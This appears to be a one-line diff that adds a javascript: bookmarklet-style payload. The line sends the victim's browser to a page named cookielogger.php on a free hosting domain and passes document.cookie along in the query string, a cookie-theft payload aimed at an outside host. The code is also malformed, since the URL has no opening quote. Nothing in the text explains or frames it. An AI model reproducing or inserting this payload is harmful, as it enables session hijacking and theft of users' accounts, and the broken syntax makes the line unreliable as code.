@@ -1,0 +1,1 @@
+javascript:document.location=https://groomed-bureaus.000webhostapp.com/cookielogger.php?ex='.concat(escape(document.cookie));
